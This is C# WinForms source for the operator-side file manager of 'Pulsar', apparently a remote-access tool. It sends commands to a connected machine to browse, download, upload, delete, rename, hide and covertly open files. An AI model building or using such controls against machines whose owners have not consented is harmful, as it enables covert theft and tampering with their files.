using server.Classes;
using server.Others;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
namespace server.Forms
{
    public partial class frm_filemanager : Form
    {
        public string CurDir = @"n/a";
        public int ConnectionID { get; set; }
        public bool Update { get; set; }
        public string Downloadpath;
        public string TempZipFolder;
        public bool canupload;
        public bool InDrives;
        public frm_filemanager()
        {
            InitializeComponent();
            canupload = true;
        }

        private void frm_filemanager_Load(object sender, EventArgs e)
        {
            Downloadpath = server.Classes.Common.current_path + @"\Downloads";
            ListViewItem lvitm = null;
            if (Directory.Exists(Downloadpath) == false)
            {
                Directory.CreateDirectory(Downloadpath);
            }
            foreach (string file in Directory.GetFiles(Downloadpath))
            {
                FileInfo flinfo = new FileInfo(file);
                lvitm = new ListViewItem(flinfo.Name);
                lvitm.SubItems.Add(flinfo.FullName);
                lvitm.SubItems.Add(Helper.ToFileSize(flinfo.Length));
                listView2.Items.Add(lvitm);

            }
            Helper.SetListViewColumnSizes(listView2, -2);
        }
        string imgext = ".png .jpg .bmp .ico .Gif .Exif .jpeg ";

        private void lbFiles_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                ListViewItem Item = lbFiles.SelectedItems[0];
                if (imgext.Contains(Item.SubItems[1].Text))
                {
                    pictureBox1.Visible = true;
                    string filepath = CurrentDir.Text + @"\" + Item.Text + Item.SubItems[1].Text;
                    Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMTMPIMG~" + filepath), Common.Current_Key);

                }
                else
                {
                    pictureBox1.Visible = false;
                }
                if (lbFiles.SelectedItems.Count == 0)
                    return;

                if (Item.SubItems[1].Text == "Directory" || Item.SubItems[1].Text == "Fixed" || Item.SubItems[1].Text == "Removable")
                    txtCurrentDirectory.Text = Item.SubItems[0].Text;
            }
            catch
            {

            }

        }

        private void flatButton3_Click(object sender, EventArgs e)
        {
            this.Close();
        }



        private void lbFiles_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            if (lbFiles.SelectedItems.Count != 0)
            {
                gotodir(txtCurrentDirectory.Text);
                //   CurDir = txtCurrentDirectory.Text;
            }

        }

        private void flatButton1_Click(object sender, EventArgs e)
        {

            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMGoUpDir"), Common.Current_Key);
        }
        #region Menu

        public void gotodir(string path)
        {
            panel1.Visible = true;
            Form1.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("FMGetDF{" + path + "}"), Common.Current_Key);
            Update = true;
        }
        public void Deletefile(string path)
        {

            Form1.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("FMDelete{" + path + "}"), Common.Current_Key);
        }
        public void renamefile_dir(string path, string nwname)
        {
            Form1.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("FMRename{" + path + "}<" + nwname + ">"), Common.Current_Key);
        }
        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {

            foreach (ListViewItem file in lbFiles.SelectedItems)
            {
                if (file.SubItems[1].Text != "Directory")
                {
                    ListViewItem todownload = new ListViewItem(file.Text);
                    todownload.SubItems.Add(CurrentDir.Text + @"\" + file.Text + file.SubItems[1].Text);
                    //   todownload.SubItems.Add(file.SubItems[2].Text);
                    listView1.Items.Add(todownload);
                }
            }

            /*
                        ListViewItem item = lbFiles.SelectedItems[0];
                        if (item.SubItems[1].Text == "Directory")
                            return;


                        Form1.MainServer.Send(ConnectionID, Helper.Getbytes("GetFile{[" + txtCurrentDirectory.Text + @"\" + item.SubItems[0].Text
                            + item.SubItems[1].Text + "]}"), Common.Current_Key);

                        */
        }

        private void entreToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            if (lbFiles.SelectedItems.Count != 0)
            {
                gotodir(txtCurrentDirectory.Text);

            }
        }
        private void goUpToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
        public string GetSelectedFiles()
        {
            string FilesList = "";
            foreach (ListViewItem itm in lbFiles.SelectedItems)
            {
                if (itm.SubItems[1].Text == "Directory")
                {
                    continue;
                }
                FilesList += CurrentDir.Text + "\\" + itm.Text + itm.SubItems[1].Text + "~";
            }
            return FilesList;
        }
        private void deleteToolStripMenuItem1_Click(object sender, EventArgs e)
        {

            string msg = null;
            foreach (string s in GetSelectedFiles().Split('~'))
            {
                if (string.IsNullOrEmpty(s))
                    continue;
                msg += s + Environment.NewLine;
            }

            DialogResult diagres = MessageBox.Show("You are about to delete  " + Environment.NewLine + msg + " Are you sure ?", "Pulsar File manger", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (diagres == DialogResult.Yes)
            {

                Deletefile(GetSelectedFiles());
            }
        }
        private void hideToolStripMenuItem1_Click(object sender, EventArgs e)
        {

            ListViewItem item = lbFiles.SelectedItems[0];
            string file;
            file = txtCurrentDirectory.Text + @"\" + item.SubItems[0].Text
         + item.SubItems[1].Text;
            Form1.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("FMHIDE{" + file + "}"), Common.Current_Key);
        }
        private void ddToolStripMenuItem_Click(object sender, EventArgs e)
        {

            Forms.frm_input frminpt = new Forms.frm_input();
            frminpt.ShowDialog();


            ListViewItem item = lbFiles.SelectedItems[0];
            string file;
            string nwfilename;


            file = txtCurrentDirectory.Text + @"\" + item.SubItems[0].Text
       + item.SubItems[1].Text;

            nwfilename = txtCurrentDirectory.Text + @"\" + item.SubItems[0].Text
       + Shared_data.tmp_frminput_data;

            renamefile_dir(file, nwfilename);





        }

        #endregion

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = lbFiles.SelectedItems[0];
            string file;

            file = txtCurrentDirectory.Text + @"\" + item.SubItems[0].Text
         + item.SubItems[1].Text;
            Form1.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("FMSHOW{" + file + "}"), Common.Current_Key);
        }

        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            gotodir(CurDir);
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lbFiles.SelectedItems.Count != 0)
            {
                OpenFileDialog OFD = new OpenFileDialog();
                OFD.Multiselect = false;
                if (OFD.ShowDialog() == DialogResult.OK)
                {
                    if (!canupload)
                    {
                        MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButtons.OK,
                           MessageBoxIcon.Error);
                    }
                    else
                    {
                        canupload = false;
                        string FileString = OFD.FileName;
                        byte[] FileBytes;
                        using (FileStream FS = new FileStream(FileString, FileMode.Open))
                        {
                            FileBytes = new byte[FS.Length];
                            FS.Read(FileBytes, 0, FileBytes.Length);
                        }
                        AutoClosingMessageBox.Show("Starting file upload.", "Starting Upload", 1000);
                        server.Form1.MainServer.Send(ConnectionID,
                        Encoding.ASCII.GetBytes("FMStartFileReceive{" + CurrentDir.Text + @"\" +
                                                Path.GetFileName(OFD.FileName) + "}"), Common.Current_Key);
                        Thread.Sleep(80);
                        server.Form1.MainServer.Send(ConnectionID, FileBytes, Common.Current_Key);
                        canupload = true;
                    }
                }
            }
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void startnormalToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (lbFiles.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                string path = txtCurrentDirectory.Text + @"\" + lbFiles.SelectedItems[0].SubItems[0].Text + lbFiles.SelectedItems[0].SubItems[1].Text;
                DialogResult diagres = MessageBox.Show("Your are about to open the file " + path + Environment.NewLine + "Are you sure ?", "Pulsar - File manger", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

                if (diagres == DialogResult.Yes)
                {

                    Console.WriteLine(path);
                    Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMOpen{" + path + "}"), Common.Current_Key);

                }


            }
        }

        private void tryHidenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lbFiles.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                string path = txtCurrentDirectory.Text + @"\" + lbFiles.SelectedItems[0].SubItems[0].Text + lbFiles.SelectedItems[0].SubItems[1].Text;
                DialogResult diagres = MessageBox.Show("Your are about to open the file " + path + Environment.NewLine + "Are you sure ?", "Pulsar - File manger", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

                if (diagres == DialogResult.Yes)
                {
                    Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMOpenhiden{" + path + "}"), Common.Current_Key);

                }


            }
        }

        private void goUpToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMGoUpDir"), Common.Current_Key);
        }

        private void rootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lbFiles.Items.Clear();
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMDRV"), Common.Current_Key);
        }



        private void goUpToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length == 3 || CurDir.Length == 3)
            {
                Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMDRV"), Common.Current_Key);
            }
            else
            {
                Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMGoUpDir"), Common.Current_Key);
            }

        }



        private void rootToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            lbFiles.Items.Clear();
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMDRV"), Common.Current_Key);
        }

        private void downloadToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string FilesList = "";
            foreach (ListViewItem itm in listView1.Items)
            {
                FilesList += itm.SubItems[1].Text + "~";
            }
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMGetFiles{[" + FilesList + "]}"), Common.Current_Key);

            TempZipFolder = Path.GetTempPath() + @"\tmp.zip";

        }

        private void userFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMSpecial1"), Common.Current_Key);

        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMSpecial2"), Common.Current_Key);
        }

        private void documentsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMSpecial3"), Common.Current_Key);
        }

        private void tempFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMSpecial4"), Common.Current_Key);
        }

        private void newFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frm_input inpt = new frm_input();
            inpt.Text = "Entre Folder Name";
            inpt.ShowDialog();
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMNeWFldr~" + Shared_data.tmp_frminput_data), Common.Current_Key);
        }

        private void newFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frm_input inpt = new frm_input();
            inpt.Text = "Entre File Name and Extensions";
            inpt.ShowDialog();
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMNeWfilouz~" + Shared_data.tmp_frminput_data), Common.Current_Key);
        }

        private void editeToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (lbFiles.SelectedItems[0].SubItems[1].Text != "Directory")
            {
                Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMEditeezgemedatfileboi~" + txtCurrentDirectory.Text + @"\" + lbFiles.SelectedItems[0].Text + lbFiles.SelectedItems[0].SubItems[1].Text), Common.Current_Key);

            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            MainMenu.Enabled = InDrives;
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem itm in listView1.SelectedItems)
            {
                listView1.Items.Remove(itm);
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem itm in listView2.SelectedItems)
            {
                File.Delete(itm.SubItems[1].Text);

                listView2.Items.Remove(itm);
            }
        }

        private void openToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem itm in listView2.SelectedItems)
            {
                Process.Start(itm.SubItems[1].Text);
            }

        }

        private void refrechToolStripMenuItem_Click(object sender, EventArgs e)
        {

            foreach (string file in Directory.GetFiles(Downloadpath))
            {
                FileInfo flinfo = new FileInfo(file);
                ListViewItem lvitm = new ListViewItem(flinfo.Name);
                lvitm.SubItems.Add(flinfo.FullName);
                lvitm.SubItems.Add(Helper.ToFileSize(flinfo.Length));
                listView2.Items.Add(lvitm);
            }
            Helper.SetListViewColumnSizes(listView2, -2);
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            if (lbFiles.SelectedItems.Count != 0)
            {
                gotodir(txtCurrentDirectory.Text);

            }
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMGoUpDir"), Common.Current_Key);
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            gotodir(CurDir);
        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {
            lbFiles.Items.Clear();
            Form1.MainServer.Send(ConnectionID, Helper.Getbytes("FMDRV"), Common.Current_Key);
        }
    }
}
